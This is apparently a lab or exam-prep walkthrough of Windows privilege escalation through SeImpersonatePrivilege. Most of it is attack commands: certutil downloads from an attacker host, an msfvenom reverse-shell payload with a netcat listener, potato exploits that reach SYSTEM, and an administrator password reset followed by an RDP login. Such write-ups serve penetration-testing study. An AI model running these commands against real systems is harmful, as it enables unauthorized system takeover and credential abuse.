# SeImpersonatePrivilege — Privilege Escalation

## 🔍 Identify the Privilege

Chris is a normal user with no interesting groups. Running `whoami /priv`:

```cmd
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

> **`SeImpersonatePrivilege` — Enabled** is the interesting one here.

---

## 📖 What is SeImpersonatePrivilege?

`SeImpersonatePrivilege` allows a process to act on behalf of another user after successful authentication. In practice, it lets a service or program **"impersonate"** a client's security context to perform actions using that client's permissions.

📚 **Reference Blog:** [HackingArticles — Windows Privilege Escalation: SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)

---

## 🖥️ Identify System Architecture

```cmd
wmic os get osarchitecture
```

| Architecture | Recommended Exploits |
|---|---|
| **x64** | `PrintSpoofer64.exe`, `SharpEfsPotato.exe`, `GodPotato-Net4.exe` |
| **x86** | `JuicyPotato.exe` (32-bit COM object compatibility) |

> Our target is **x64**, so we proceed with PrintSpoofer64 / SharpEfsPotato / GodPotato.

---

## 🚀 Method 1: PrintSpoofer64.exe ❌

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/printspoofer64.exe .
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/printspoofer64.exe
.\printspoofer64.exe -i -c whoami
.\printspoofer64.exe -i -c "net user administrator admin@1234"
```

> ❌ **Result:** `[-] Operation failed or timed out.`
> PrintSpoofer did not work on this target. Moving to next method.

---

## 🚀 Method 2: SharpEfsPotato.exe ✅

### Kali — Setup

```bash
cp /root/Desktop/OSCP+/ad-tools/SharpEfsPotato.exe .
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=445 -f exe -o reverse.exe
python3 -m http.server 80
```

### Target — Transfer

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/SharpEfsPotato.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/reverse.exe
```

### Kali — Start Listener

```bash
rlwrap nc -lvnp 445
```

### Target — Execute

```cmd
.\SharpEfsPotato.exe -p reverse.exe
```

> ✅ **Result:** Got reverse shell as `nt authority\system`

```cmd
cd C:\Users\Administrator\Desktop
type proof.txt
```

---

## 🚀 Method 3: GodPotato-Net4.exe ✅

### Kali — Setup

```bash
cp /home/srahul/Desktop/OSCP+/ad-tools/godpotato-net4.exe .
python3 -m http.server 80
```

### Target — Transfer & Execute

```cmd
cd C:\Users\chris\Desktop
certutil -urlcache -split -f http://<ATTACKER_IP>/godpotato-net4.exe
.\godpotato-net4.exe -cmd "cmd /c net user administrator admin@1234"
```

> ✅ **Result:** The command completed successfully. Administrator password changed.

### RDP as Administrator

Since RDP (port 3389) is open from Nmap output, we can now RDP with the new creds:

```bash
xfreerdp3 /u:Administrator /p:admin@1234 /v:<TARGET_IP>
```

> ✅ **Result:** Got Administrator RDP Access!

---

## 📊 Summary — What Worked

| Method | Tool | Result |
|---|---|---|
| Method 1 | PrintSpoofer64.exe | ❌ Failed — timed out |
| Method 2 | SharpEfsPotato.exe | ✅ Reverse shell as SYSTEM |
| Method 3 | GodPotato-Net4.exe | ✅ Changed admin password → RDP |

---

## 💡 Key Takeaways

- **Always try multiple tools** — PrintSpoofer may fail on certain configurations, but SharpEfsPotato or GodPotato might work
- **SharpEfsPotato** is great when you need a reverse shell
- **GodPotato** is great for quick command execution (e.g., changing passwords)
- If RDP is open, changing the admin password and RDP-ing in is a clean method
- Use `rlwrap` with `nc` for better shell experience (arrow keys, history)

---

## 🔗 Tool Download Links

| Tool | GitHub |
|---|---|
| PrintSpoofer | [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| SharpEfsPotato | [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) |
| GodPotato | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) |
| JuicyPotato | [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato) |
| SweetPotato | [CCob/SweetPotato](https://github.com/CCob/SweetPotato) |